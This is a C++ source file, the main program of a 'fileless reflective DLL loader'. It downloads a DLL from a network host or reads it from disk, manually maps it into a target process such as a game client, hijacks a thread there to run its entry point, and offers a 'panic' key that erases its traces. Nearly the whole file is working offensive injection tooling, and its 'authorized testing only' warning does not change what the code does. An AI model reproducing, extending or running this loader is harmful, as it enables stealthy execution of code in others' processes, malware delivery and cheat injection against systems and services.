#include <iostream>
#include <windows.h>
#include <string>
#include "NetworkStream.h"
#include "PEMapper.h"
#include "ThreadHijacker.h"
#include "PanicFunction.h"

void PrintBanner() {
    std::cout << R"(
╔══════════════════════════════════════════════════════════════════╗
║          Fileless Reflective DLL Loader v1.0                     ║
║          Thread Execution Hijacking Edition                      ║
╚══════════════════════════════════════════════════════════════════╝
)" << std::endl;
}

void PrintUsage(const char* programName) {
    std::cout << "Usage: " << programName << " <mode> [options]" << std::endl;
    std::cout << std::endl;
    std::cout << "Modes:" << std::endl;
    std::cout << "  local   - Load DLL from local file" << std::endl;
    std::cout << "            " << programName << " local <dll_path> <target_process>" << std::endl;
    std::cout << "  network - Load DLL from network" << std::endl;
    std::cout << "            " << programName << " network <host> <port> <resource> <target_process>" << std::endl;
    std::cout << std::endl;
    std::cout << "Examples:" << std::endl;
    std::cout << "  " << programName << " local payload.dll notepad.exe" << std::endl;
    std::cout << "  " << programName << " network 192.168.1.100 8080 /payload.dll FiveM.exe" << std::endl;
    std::cout << std::endl;
    std::cout << "WARNING: This tool is for educational and authorized testing purposes only!" << std::endl;
}

bool ExecutePanicOnKeyPress(ThreadHijacker& hijacker, PEMapper& mapper, HANDLE targetProcess) {
    std::cout << std::endl;
    std::cout << "[*] Press 'P' to activate PANIC function and self-erase..." << std::endl;
    std::cout << "[*] Press 'Q' to quit without panic..." << std::endl;
    
    while (true) {
        if (GetAsyncKeyState('P') & 0x8000) {
            PanicFunction panic;
            panic.Execute(hijacker, mapper, targetProcess);
            return true;
        }
        
        if (GetAsyncKeyState('Q') & 0x8000) {
            std::cout << "[*] Exiting without panic function..." << std::endl;
            return false;
        }
        
        Sleep(100);
    }
}

int main(int argc, char* argv[]) {
    PrintBanner();
    
    std::cout << "╔══════════════════════════════════════════════════════════════════╗" << std::endl;
    std::cout << "║ WARNING: For Educational and Authorized Testing Only            ║" << std::endl;
    std::cout << "║ Unauthorized use is illegal and unethical.                      ║" << std::endl;
    std::cout << "║ Use only on systems you own or have explicit permission to test.║" << std::endl;
    std::cout << "╚══════════════════════════════════════════════════════════════════╝" << std::endl;
    std::cout << std::endl;
    
    if (argc < 3) {
        PrintUsage(argv[0]);
        return 1;
    }
    
    std::string mode = argv[1];
    std::vector<uint8_t> dllBuffer;
    std::string targetProcessName;
    
    // Step 1: Fetch DLL from network or local file
    NetworkStream netStream;
    
    if (mode == "local") {
        if (argc < 4) {
            PrintUsage(argv[0]);
            return 1;
        }
        
        const char* dllPath = argv[2];
        targetProcessName = argv[3];
        
        std::cout << "[*] Mode: Local file loading" << std::endl;
        std::cout << "[*] DLL Path: " << dllPath << std::endl;
        std::cout << "[*] Target Process: " << targetProcessName << std::endl;
        std::cout << std::endl;
        
        std::cout << "[1/5] Fetching DLL from local file..." << std::endl;
        dllBuffer = netStream.FetchDLL(dllPath);
        
    } else if (mode == "network") {
        if (argc < 6) {
            PrintUsage(argv[0]);
            return 1;
        }
        
        const char* host = argv[2];
        int port = std::stoi(argv[3]);
        const char* resource = argv[4];
        targetProcessName = argv[5];
        
        std::cout << "[*] Mode: Network loading" << std::endl;
        std::cout << "[*] Host: " << host << ":" << port << std::endl;
        std::cout << "[*] Resource: " << resource << std::endl;
        std::cout << "[*] Target Process: " << targetProcessName << std::endl;
        std::cout << std::endl;
        
        std::cout << "[1/5] Fetching DLL from network..." << std::endl;
        dllBuffer = netStream.FetchDLLFromNetwork(host, port, resource);
        
    } else {
        std::cerr << "[!] Invalid mode: " << mode << std::endl;
        PrintUsage(argv[0]);
        return 1;
    }
    
    if (dllBuffer.empty()) {
        std::cerr << "[!] Failed to fetch DLL" << std::endl;
        return 1;
    }
    
    // Step 2: Find target process
    std::cout << std::endl;
    std::cout << "[2/5] Finding target process..." << std::endl;
    
    ThreadHijacker hijacker;
    DWORD processId = hijacker.FindTargetProcess(targetProcessName.c_str());
    
    if (processId == 0) {
        std::cerr << "[!] Target process not found. Make sure " << targetProcessName << " is running." << std::endl;
        return 1;
    }
    
    HANDLE targetProcess = hijacker.OpenTargetProcess(processId);
    if (!targetProcess) {
        std::cerr << "[!] Failed to open target process" << std::endl;
        return 1;
    }
    
    // Step 3: Manually map DLL
    std::cout << std::endl;
    std::cout << "[3/5] Performing manual PE mapping..." << std::endl;
    
    PEMapper mapper;
    LPVOID baseAddress = mapper.MapDLL(dllBuffer, targetProcess);
    
    if (!baseAddress) {
        std::cerr << "[!] Failed to map DLL" << std::endl;
        CloseHandle(targetProcess);
        return 1;
    }
    
    std::cout << "[+] DLL mapped successfully at: 0x" << std::hex << baseAddress << std::dec << std::endl;
    
    // Step 4: Find and hijack thread
    std::cout << std::endl;
    std::cout << "[4/5] Hijacking thread execution..." << std::endl;
    
    DWORD threadId = hijacker.FindTargetThread(processId);
    if (threadId == 0) {
        std::cerr << "[!] Failed to find target thread" << std::endl;
        CloseHandle(targetProcess);
        return 1;
    }
    
    LPVOID entryPoint = mapper.GetEntryPoint();
    if (!hijacker.HijackThread(threadId, entryPoint)) {
        std::cerr << "[!] Failed to hijack thread" << std::endl;
        CloseHandle(targetProcess);
        return 1;
    }
    
    // Step 5: Success
    std::cout << std::endl;
    std::cout << "[5/5] ✓ Injection complete!" << std::endl;
    std::cout << std::endl;
    std::cout << "╔══════════════════════════════════════════════════════════════════╗" << std::endl;
    std::cout << "║ DLL successfully injected via thread hijacking                   ║" << std::endl;
    std::cout << "║ Base Address: 0x" << std::hex << baseAddress << std::dec << std::string(43, ' ') << "║" << std::endl;
    std::cout << "║ Entry Point:  0x" << std::hex << entryPoint << std::dec << std::string(43, ' ') << "║" << std::endl;
    std::cout << "╚══════════════════════════════════════════════════════════════════╝" << std::endl;
    
    // Wait for panic function activation
    ExecutePanicOnKeyPress(hijacker, mapper, targetProcess);
    
    CloseHandle(targetProcess);
    
    std::cout << std::endl;
    std::cout << "[*] Exiting..." << std::endl;
    
    return 0;
}
